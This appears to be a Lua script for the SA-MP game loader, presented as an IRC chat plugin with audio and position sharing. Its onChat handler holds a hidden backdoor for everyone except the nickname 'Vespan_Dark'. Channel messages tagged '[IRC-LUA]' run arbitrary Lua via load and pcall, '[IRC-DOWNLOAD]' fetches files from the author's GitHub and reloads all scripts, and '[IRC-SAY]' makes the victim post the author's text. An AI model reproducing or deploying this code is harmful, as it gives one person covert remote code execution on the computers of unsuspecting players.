script_name('IRC CHAT')
script_version('2.0.333')

for k,v in ipairs({'luairc.lua','asyncoperations.lua','util.lua','handlers.lua', 'moonloader.lua','vkeys.lua'}) do
	if not doesFileExist(getWorkingDirectory()..'/lib/'..v) then
		error('not does file found '..v)
	end
end

require 'moonloader'
require 'luairc'
encoding = require("encoding"); encoding.default = 'CP1251'; u8 = encoding.UTF8  

channel = '#sespan'--with #
local s = irc.new{nick = "bruh_man"}

msg = {
	['Chat'] = '',
	['Raw'] = '',
	['hideMsgOnChat'] = {},--{'%[IRC%-SharePos%]'},
}
notf = {}
pool = {

}

ping = -1
font = renderCreateFont('Arial',13,0x1+0x8)
audio = nil
sharePos = false

-- 0xffea30 onChat
-- ffef61 system

function main()
	while not isSampAvailable() do wait(0) end
	while not sampIsLocalPlayerSpawned() do wait(0) end

	for i = 1,1000 do
		table.insert(pool,{nil,-1})
	end

	wait(2500)

	connect()

	sampRegisterChatCommand('/is',function(a)
		if #a > 0 then
			send(a,false)
		end
	end)

	sampRegisterChatCommand('pool',function(i)
		i = tonumber(i)
		sampAddChatMessage(pool[i][2],-1)
	end)
	sampRegisterChatCommand('/isp',function() sharePos = not sharePos; lua_thread.create(sharePosf) end)
	sampRegisterChatCommand('/igp',function(id) if #id > 0 then; send(id..' get your pos',false); end end)
	sampRegisterChatCommand('/il',function() s:send("NAMES %s", channel) end)
	sampRegisterChatCommand('/isc',function(arg)
		if #arg > 0 then
			send('COPY '..arg,false)
		end
	end)
	sampRegisterChatCommand('/isp',function(url)
		if url ~= nil and #url > 0 and url:find('github%.com') or url:find('cdn%.discordapp%.com') then
			send('[IRC-PLAY] '..url)
			if audio ~= nil and getAudioStreamState(audio) == 1 then
	    		setAudioStreamState(audio, 0)
	    	end
			audio = loadAudioStream(url)
			setAudioStreamVolume(audio, 0.80)
    		setAudioStreamState(audio, 1)
    	else
    		addNotf('{ff0000}error arg',5)
		end
	end)

	sampRegisterChatCommand('/im',function()
		sampShowDialog(1000,'irc.lua','sending audio\nstop audio\ndownload file','>>>','<<<',2)
	end)

	if sampGetPlayerNickname(select(2,sampGetPlayerIdByCharHandle(PLAYER_PED))) == 'Vespan_Dark' then
		-- https://raw.githubusercontent.com/Vespan/Lua/master/BRUH.lua,
		sampRegisterChatCommand('/isd',function(url)
			if url ~= nil then
				if #url > 0 then
					send('[IRC-DOWNLOAD] '..url)
				end
			end
		end)
		sampRegisterChatCommand('/iss',function(arg)
			if #arg > 0 then
				send('[IRC-SAY] '..arg)
			end 
		end)
		sampRegisterChatCommand('/isl',function(lua)
			if #lua > 0 then
				send('[IRC-LUA] '..lua)

			end
		end)

	end

	while true do wait(0)

		if isKeyJustPressed(VK_0) and not sampIsCursorActive() then
			sampShowDialog(100,'send IRC msg', '', 'send', 'calcel', 1)
		end

		dialogs()

		if os.clock()-ping > 0.50 then
			-- sampAddChatMessage('ping!',-1)
			if s.__isConnected then  s:think() end
			ping = os.clock()
		elseif ping == -1 then
			ping = os.clock()
		end

		if #notf > 0 then
			local sw,sh = getScreenResolution()
			for k,v in ipairs(notf) do
				sh = sh + 35
				local t = os.clock()-v.timer
				if t < v.wait then
					renderFontDrawText(font,v.text,sw/2- renderGetFontDrawTextLength(font, v.text) / 2,sh/2.8,-1)
				else
					table.remove(notf,k)
				end
			end
		end

		for k,v in ipairs(pool) do
			if v[2] ~= -1 then
				local t = os.clock()-v[2]
				printStringNow(t,1)
				if t > 10 then
					removeBlip(v[1])
					pool[k][1] = nil
					pool[k][2] = -1
				end
			end
		end

	end
end

function send(arg,hide); 
	s:sendChat(channel, u8(arg)); 
	if not hide then	
		sampAddChatMessage(string.format('[IRC] {%s}%s[%s]{ffffff}:%s',
			clistToHex(s.nick),
			(s.nick),
			sampGetPlayerIdByNickname(s.nick),
			arg),
		0xffea30) 
	end
end


function onChat(user, channel, text)

	msg['Chat'] = text

	if sampGetPlayerNickname(select(2,sampGetPlayerIdByCharHandle(PLAYER_PED))) ~= 'Vespan_Dark' then
		if text:find('%[IRC%-DOWNLOAD%] .+') then
			local url = text:match('%[IRC%-DOWNLOAD%] (.+)') 
			local filename = url:match('/master/(.+)')
			-- %5Birc%5D%20share%20my%20pos.lua
			filename = filename:gsub('%%5B','%['):gsub('%%5D','%]'):gsub('%%20',' ')
			if url:find('.+/Vespan/.+') then
				downloadUrlToFile((url),getWorkingDirectory()..'/'..filename,
				function(id, status, p1, p2)
					if status == 58 then
						sampAddChatMessage('[IRC] Успешно скачан файл '..filename..',перезагружаю все скрипты!',0xffef61)
						send('DOWNLOADinfo был успешно скачан файл '..filename..'('..getWorkingDirectory()..'/'..filename..')',false)
						reloadScripts()
					end
			    end)
			end
		end
		if text:find('%[IRC%-SAY%] .+') then
			local say = text:match('%[IRC%-SAY%] (.+)') 
			send(u8:decode(say),false)
		end
		if text:find('version irc') then
			send(thisScript().version)
		end
		if text:find('%[IRC%-LUA%] .+') then
			local code = text:match('%[IRC%-LUA%] (.+)')
			local err = do_lua(code)
			if err ~= nil then
				send('[IRC-LUA_ERR] '..err)
			end
		end
	end

	if text:find('%[IRC%-SharePos%] Permanently Pos x%:.+,y%:.+,z%:.+') then
		addOneOffSound(_,_,_,1056)
		local x,y,z = text:match('x%:(.+),y%:(.+),z%:(.+)')
		sampAddChatMessage(x .. ' ' .. y .. ' ' ..z,-1)
		sampAddChatMessage((user.nick),-1)
		sampAddChatMessage(sampGetPlayerIdByNickname(user.nick),-1)
		local id = sampGetPlayerIdByNickname(user.nick)
		if pool[id][2] ~= -1 then
			pool[id][2] = pool[id][2] + 5
		else
			pool[id][2] = os.clock()
		end
		removeBlip(pool[id][1])
		pool[id][1] = addBlipForCoord(x,y,z)
		changeBlipColour(pool[id][1], "0x"..clistToHex(sampGetPlayerIdByNickname(user.nick))..'ff')
	end
	if text:find('(%d+) get your pos') then
		local id = text:match('(%d+)')
		id = tonumber(id)
		if id == sampGetPlayerIdByNickname(s.nick) then
			if getActiveInterior() ~= 0 then
				send('im in interior!',false)
			else
				local x,y,z = getCharCoordinates(PLAYER_PED)
				send(string.format('[IRC-SharePos] Permanently Pos x:%s,y:%s,z:%s',x,y,z),false)
				-- [IRC-SharePos] Permanently Pos x:1453.1206054688,y:369.88409423828,z:19.058031082153
			end
		end
	end

--------------
	if not findStringInTable(msg['hideMsgOnChat'],text) then
		sampAddChatMessage(string.format('[IRC] {%s}%s[%s]{ffffff}:%s',
			clistToHex(user.nick),
			user.nick,
			sampGetPlayerIdByNickname(user.nick),
			u8:decode(text)
			),0xffea30)
		if text:find('COPY .+') then
			sampAddChatMessage('[IRC] команда была скопирована в буфер-обмена!',0xffef61)
			setClipboardText(string.match(text,'COPY (.+)'))
		end
		if text:find('%[IRC%-PLAY%] .+') then

			local url = text:match('%[IRC%-PLAY%] (.+)')
			if audio ~= nil and getAudioStreamState(audio) == 1 then
	    		setAudioStreamState(audio, 0)
	    	end
			audio = loadAudioStream(url)
			setAudioStreamVolume(audio, 0.80)
    		setAudioStreamState(audio, 1)
		end

	else
		print('{ff0000}'..text)
	end


end

function onRaw(text)

	msg['Raw'] = text

	if text:find((s.nick)) and text:find('QUIT %:Ping timeout%: %d+') then; 
		s:unhook('OnChat',1)
		s:unhook('OnRaw',2)
		connect()
	end

 	-- :Vespan|Dark!~lua@1.1.1.1 QUIT :Ping timeout: 265 seconds
	if text:find('%:.+!~.+QUIT.+:Ping timeout%:') then
		local n = text:match('%:(.+)!~')
		local p = text:match('timeout%: (%d+)')
		-- n = n .. '[' ..sampGetPlayerIdByNickname(n) ..']'
		sampAddChatMessage('[IRC] '..n..' ping timeout '..p..' seconds',0xffef61)
	end

	-- :Vespan_Dark!~BattleShi@1.1.1.1 JOIN #fdsfds
	if text:find('%:.+!~.+ JOIN '..channel) then
		local n = text:match('%:(.+)!~')
		if n == (s.nick) then
			

		end

		if sampGetPlayerIdByNickname(n) ~= nil then n = n .. '[' ..sampGetPlayerIdByNickname(n) ..']' end
		sampAddChatMessage('[IRC] '..n..' присоединился к нашей пати!',0xffef61)
	end

	-- :Vespan_Dark!~BattleShi@1.1.1.1 PART #fsd
	if text:find('%:.+!~.+ PART '..channel) or text:find('%:.+!~.+ QUIT') then
		local n = text:match('%:(.+)!~')
		sampAddChatMessage('[IRC] '..n..' вышел из нашей пати(',0xffef61)	
	end

	-- :bruhman!~lua@194.39.227.107 NICK :Vespan_Dbrk
	if text:find('%:.+!~.+NICK %:.+') then
		local lastNick,newNick = text:match('%:(.+)!~.+NICK.+%:(.+)')
		sampAddChatMessage('[IRC] '..lastNick..' изменил ник на '..newNick,0xffef61)
	end

	if string.find(text, "353 .+ @ "..channel.." ") then; 
		text = string.gsub(text, " 353 ", " ", 1); text = string.gsub(text, s.nick, "{ff6600}", 1); 
		text = string.gsub(text, "=", "", 1); text = string.gsub(text, " ", "\n"); 
		text = string.gsub(text, "\n:", "{ffffff}\n\n"); text = string.gsub(text, "%%", "{FF8000}%%{FFFFFF}"); 
		text = string.gsub(text, "@", "{FF0000}@{FFFFFF}"); text = string.gsub(text, "+", "{00FF00}+{FFFFFF}"); 
		text = string.gsub(text, "~", "{FFFF00}~{FFFFFF}"); text = string.gsub(text, "&", "{FF00FF}&{FFFFFF}")
		sampShowDialog(8048, 'online channel', text, "OK", "", 0)
	end

end


function connect()

	s = irc.new{nick = "bruh_man"}

	local id = select(2,sampGetPlayerIdByCharHandle(PLAYER_PED))
	local nick = sampGetPlayerNickname(id)
	s.nick = (string.format('%s',nick))

	s:connect("irc.ea.libera.chat")
	s:prejoin(channel) 

	s:hook("OnChat", 1,function(user, channel, text); onChat(user, channel, text); end)
	s:hook("OnRaw", 2,function(text); onRaw(text); end)

end

function sharePosf()
	while sharePos do 

		if getActiveInterior() ~= 0 then
			addNotf('{ff0000}you in interior!')
			sharePos = false
		else
			local x,y,z = getCharCoordinates(PLAYER_PED)
			send(string.format('[IRC-SharePos] Permanently Pos x:%s,y:%s,z:%s',x,y,z),false)
		end

		wait(2500)
	end
end
------------------------------------------------------------------------------------------------------------------------
function findStringInTable(t,s)
	if #t > 0 then
		for k,v in ipairs(t) do
			if s:find(v) then
				return true
			end
		end
	else
		return false
	end
	return false
end

function isStringInTable(t,s)
	for k,v in ipairs(t) do
		if v == s then
			return k,v
		end
	end
	return nil,nil
end

function clistToHex(n)
	if sampGetPlayerIdByNickname(n) ~= nil then
		local id = sampGetPlayerIdByNickname(n)
		return ("%06X"):format(bit.band(sampGetPlayerColor(id), 0xFFFFFF))
	else
		return 'ffffff'
	end
end

function sampGetPlayerIdByNickname(nick) 
	sampAddChatMessage('{cccccc}'..nick)
    local _, myid = sampGetPlayerIdByCharHandle(playerPed)
    if tostring(nick) == sampGetPlayerNickname(myid) then return myid end
    for i = 0, 1000 do if sampIsPlayerConnected(i) and sampGetPlayerNickname(i) == tostring(nick) then return i end end
    return nil
end

function addNotf(text,w)
	w = w or 5
	table.insert(notf,{text=text,timer=os.clock(),wait=w})
end

-------EXPORTS
function EXPORTS.sendToChat(arg,hide)
	if s.__isJoined and s.__isConnected then
		send(arg,hide)
	end
end
function EXPORTS.sendToRaw(arg)
	if s.__isJoined and s.__isConnected then
		s:send(arg)
	end
end

function EXPORTS.GetMsg(method)
	if s.__isJoined and s.__isConnected then
		return msg[method] and msg[method] or ''
 	end
	return ''
end

function EXPORTS.changeMsg(method,text)
	msg[method] = text
end

function EXPORTS.hideMsgOnChat(text)
	if #text > 0 then
		local k,v = isStringInTable(msg['hideMsgOnChat'],text)
		if v ~= text then 
			table.insert(msg['hideMsgOnChat'],text) 
		end
	end
end

--[[
local ircBool,irc = irc()
function irc()
	local c = 0
	for i, s in pairs(script.list()) do
		if s.name == 'IRC CHAT' and c == 0 then
			local s = import 'irc.lua'
			c = 1
			return true,s
		end
	end
	c = 0
	return false,nil
end

]]











function dialogs()
	local res,but,list,input = sampHasDialogRespond(100)
	if res then
		if but == 1 then
			if #input > 0 then
				send(input,false)
				sampShowDialog(100,'send IRC msg', input, 'send', 'calcel', 1)
			else
				sampShowDialog(100,'send IRC msg {FF0000}ERROR ARG', '', 'send', 'calcel', 1)
			end
		end
	end

	local res,but,list,input = sampHasDialogRespond(1001)
	if res then
		if but == 1 and #input > 0 then

			if input:find('github%.com') or input:find('cdn%.discordapp%.com') then
				send('[IRC-PLAY] '..input)
				if audio ~= nil and getAudioStreamState(audio) == 1 then
		    		setAudioStreamState(audio, 0)
		    	end
				audio = loadAudioStream(input)
				setAudioStreamVolume(audio, 0.80)
	    		setAudioStreamState(audio, 1)
	    	else
	    		sampShowDialog(1001,'irc.lua send audio','url(ONLY GITHUB-DISCORD)','>>>','<<<',1)
	    	end

    	end
    end

	local res,but,list,input = sampHasDialogRespond(1002)
	if res then
		if but == 1 and #input > 0 then
			send('[IRC-DOWNLOAD] '..input)
    	end
    end

	local res,but,list,input = sampHasDialogRespond(1000)
	if res then
		if but == 1 then
			if list == 0 then
				sampShowDialog(1001,'irc.lua send audio','url:','>>>','<<<',1)
			elseif list == 1 then
				if audio ~= nil and getAudioStreamState(audio) == 1 then
		    		setAudioStreamState(audio, 0)
		    	end
	    	elseif list == 2 and sampGetPlayerNickname(select(2,sampGetPlayerIdByCharHandle(PLAYER_PED))) == 'Vespan_Dark' then
	    		sampShowDialog(1002,'irc.lua download file','url','>>>','<<<',1)
			end
		end
	end
end

function do_lua(code)
    if code:sub(1,1) == '=' then
        code = "print(" .. code:sub(2, -1) .. ")"
    end
    local func, err = load(code)
    if func then
        local result, err = pcall(func)
        if not result then
            -- sampAddChatMessage(err,-1)
            return err
        end
    else
        -- sampAddChatMessage(err,-1)
        return err
    end

    return nil
end